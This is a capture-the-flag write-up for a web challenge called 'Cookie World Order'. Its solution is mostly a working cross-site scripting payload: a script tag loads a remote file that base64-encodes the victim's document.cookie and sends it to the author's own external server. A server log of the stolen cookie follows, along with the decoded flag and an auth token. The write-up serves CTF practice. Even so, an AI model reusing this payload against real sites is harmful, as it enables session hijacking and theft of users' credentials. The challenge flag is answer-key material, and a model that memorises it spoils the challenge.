# Cookie World Order (web)
Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

https://cwo-xss.web.ctfcompetition.com/

### Solution

This task is pretty easy to solve. We have a typical XSS attack here.
```html
<SCRIPT SRC="https://mfurga.com/xss.js"></SCRIPT>

<!-- xss.js -->
"use strict";
(function() {
  var req = new XMLHttpRequest();
  req.open(
    "GET", "https://mfurga.com?data=" + btoa(document.cookie), false);
  req.send();
})();
```
```js
104.155.55.51 - - [28/Jul/2019:16:03:51 +0200] "GET /?data=ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg== HTTP/1.0" 200 1959 "https://cwo-xss.web.ctfcompetition.com/exploit?reflect=%3CSCRIPT/XSS%20SRC=%22https://mfurga.com/xss.js%22%3E%3C/SCRIPT%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3827.0 Safari/537.36"

> atob("ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg==")
"flag=CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}; auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"
```

**FLAG: CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}**

